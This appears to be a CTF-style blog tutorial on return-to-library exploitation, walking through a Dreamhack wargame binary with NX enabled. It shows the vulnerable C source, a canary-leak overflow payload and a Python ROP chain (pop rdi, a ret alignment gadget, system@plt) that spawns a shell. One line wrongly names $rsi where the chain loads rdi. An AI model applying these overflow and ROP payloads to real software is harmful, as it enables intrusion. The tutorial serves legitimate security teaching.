---
title : "Return To Library"
published: true
---

# Stack Protection: NX and ASLR
Traditional system exploitation often relied on stack overflow attacks. To mitigate this, architects introduced stack canary, which protects the return address on the stack from being written.

However, attackers later found ways to bypass the canary by injecting a shellcode to the stack and changing the return address to point to that shellcode.

To defend against these attacks, NX and ASLR were introduced:
- **NX(No-eXecute)**: Prevents execution of code on the stack.**
- **ASLR(Address Space Layout Randomization)**: Randomizes memory address at runtime, making it harder for attackers to predict the location of critical code or data.

# NX
What happens when the stack is non-executable?
In traditional stack overflow exploits, we would inject shellcode into the stack.
But with NX enabled, we can no longer execute shellcode stored there.
Instead of executing shellcode, we can redirect execution to existing functions like `system("/bin/sh")`. To perform this, we need:

- The address of `system@plt` function in PLT
- A pointer to the string of `/bin/sh`
- A **proper ROP gadget** to setup arguments
- (optional) a `ret` gadget for stack alignment
## Gadget?
Gadget is a short sequence of assembly instructions ending in a `ret` instruction, used to build a Return-Oriented Programming chain. We can find gadget using `ROPgadget --binary ./<target_binary> --re "<instruction>"` command in shell.

## Example: Return to Library

[Dreamhack](https://dreamhack.io/wargame/challenges/353)
```bash
pwndbg> checksec
File:     /home/yeon/dreamhack/rtl/rtl
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Since `./rtl.c` is compiled with NX enabled, we cannot inject and execute shellcode from the stack.

Given c code is as follows:
```c
  7 const char* binsh = "/bin/sh";
  8
  9 int main() {
 10   char buf[0x30];
 11
 12   setvbuf(stdin, 0, _IONBF, 0);
 13   setvbuf(stdout, 0, _IONBF, 0);
 14
 15   // Add system function to plt's entry
 16   system("echo 'system@plt'");
 17
 18   // Leak canary
 19   printf("[1] Leak Canary\n");
 20   printf("Buf: ");
 21   read(0, buf, 0x100);
 22   printf("Buf: %s\n", buf);
 23
 24   // Overwrite return address
 25   printf("[2] Overwrite return address\n");
 26   printf("Buf: ");
 27   read(0, buf, 0x100);
 28
 29   return 0;
 30 }
```

We observe the following:
- `system("echo 'system@plt'")` adds `system@plt` to PLT
- `buf` has vulnerability of stack overflow
- The first `read` leaks the canary
- The second read allows us to overwrite the return address

By inspecting the assembly code of `main` function, we could figure out the structure of stack:
![](https://i.imgur.com/a4qyRmo.png)
> **Question**: Why `?` area is needed?
> It may be related with requirement of stack alignment of `movaps`...

### 1st read: Leak Canary

```python
payload1 =
	b"A" * 0x30 + b"A" * 0x8 + b"\n"
```

We can overwrite the null byte at the beginning of the canary to leak the rest via `printf`. So we send total 0x39 bytes.

### 2nd read: RET Overwrite
We will use a chain of ROP to call system function.
- The first `RET` region indicates `pop rdi; ret` gadget
- `RET+0x8` region indicates `/bin/sh` so that it can be stored in $rsi
- `RET+0x10` region indicates `ret` gadget **to make 16-byte alignment**
- `RET+0x18` region indicates `system@plt`
![](https://i.imgur.com/ulb6CKY.png)
We can write payload as follows:

```python
payload2 =
	b"A" * 0x38 +
	cnry +
	b"B" * 0x8 +
	p64(gadget1_addr) + # pop rdi; ret
	p64(binsh) + # /bin/sh to rdi
	p64(gadget2_addr) + # ret
	p64(system_plt) # system@plt
```



